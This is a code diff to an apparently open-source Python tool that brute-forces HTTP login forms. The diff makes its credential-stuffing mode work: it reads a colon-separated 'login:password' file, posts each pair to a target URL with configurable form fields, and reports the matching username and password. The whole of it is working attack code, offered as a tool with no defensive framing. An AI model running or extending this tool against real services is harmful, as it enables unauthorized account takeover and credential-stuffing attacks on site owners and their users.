@@ -14,7 +14,7 @@ print("Author @adomigold,", "Github account: https://github.com/adomigold/ \n")
 parser = argparse.ArgumentParser()
 parser.add_argument('-a', '--attack', type=str, help="Target url or IP adress")
 parser.add_argument('-l', '--login', type=str, help="Target username")
-parser.add_argument('-C', '--colon_file', help="File contain usernames")
+parser.add_argument('-C', '--colon_file', help="Colon separated 'login:password' files")
 parser.add_argument('-p', '--password', type=str, help="Target Password")
 parser.add_argument('-P', '--password_file', type=str, help="File contains passwords")
 parser.add_argument('-t', '--threads', type=str, help="Thread connection")
@@ -34,7 +34,7 @@ if len(sys.argv) < 2:
 if args.service == "http":
     target = args.attack
     username = args.login
-    username_file = args.username_file
+    colon_file = args.colon_file
     password = args.password
     password_file = args.password_file
     response = args.response
@@ -74,25 +74,24 @@ if args.service == "http":
                   "\n----------------------------------------------------------------")
             exit(0)
 
-    # When username file is provided
-    elif args.username_file in sys.argv:
-        file = args.colon_file
+    # When colon file is provided
+    elif args.colon_file in sys.argv:
+        file = open(colon_file)
         for line in file.readlines():
             if ":" in line:
-                user = line.split(':')[0]
-                pwd = line.split(':')[1]
+                user = line.rsplit(':')[0]
+                pwd = line.rsplit(':')[1]
                 if args.verbose in sys.argv:
                     if args.verbose != "show":
                         break
                     print('[+]', user, '_', pwd)
-                post = {'username': user, 'password': pwd, 'submit': "Submit"}
+                post = {f'{form1}': user, f'{form2}': pwd, 'submit': "Submit"}
                 re = requests.post(target, data=post)
-                break
                 if args.response in re.text:  # Change this according to the server respond when login attempt failed
                     pass
                 else:
                     print("\n------------------------------------------------"
-                          "\n Username and Password found", '\033[1;92m', pwd,
+                          "\n Username and Password found", '\033[1;92m', user, pwd,
                           "\n------------------------------------------------")
                     break
         else:
